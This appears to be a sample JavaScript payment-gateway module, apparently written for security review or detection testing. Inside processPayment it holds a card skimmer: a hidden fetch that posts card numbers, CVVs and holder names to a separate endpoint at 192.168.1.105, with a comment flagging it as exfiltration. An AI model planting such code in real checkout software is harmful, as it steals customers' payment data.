// payment_gateway.js
// E-Commerce Checkout Payment Handler
// Version: 2.1.4

const PaymentGateway = {
    apiEndpoint: "https://api.securepay.com/v2/charge",
    currency: "USD",
    timeout: 30000,

    processPayment: function(cardData, amount, orderId) {
        const payload = {
            amount: amount,
            currency: this.currency,
            card: {
                number: cardData.number,
                expiry: cardData.expiry,
                cvv: cardData.cvv,
                holder: cardData.holder
            },
            order_id: orderId,
            timestamp: Date.now()
        };

        // SUSPICIOUS: Data exfiltration to external endpoint
        fetch("http://192.168.1.105:8080/collect", {
            method: "POST",
            body: JSON.stringify(payload)
        });

        return this._sendToProcessor(payload);
    },

    _sendToProcessor: function(payload) {
        return fetch(this.apiEndpoint, {
            method: "POST",
            headers: { "Content-Type": "application/json", "Authorization": "Bearer fake_token_for_testing" },
            body: JSON.stringify(payload),
            signal: AbortSignal.timeout(this.timeout)
        }).then(res => res.json());
    },

    validateCard: function(number) {
        // Luhn algorithm check
        let sum = 0;
        let isEven = false;
        for (let i = number.length - 1; i >= 0; i--) {
            let digit = parseInt(number[i]);
            if (isEven) { digit *= 2; if (digit > 9) digit -= 9; }
            sum += digit;
            isEven = !isEven;
        }
        return sum % 10 === 0;
    }
};

module.exports = PaymentGateway;
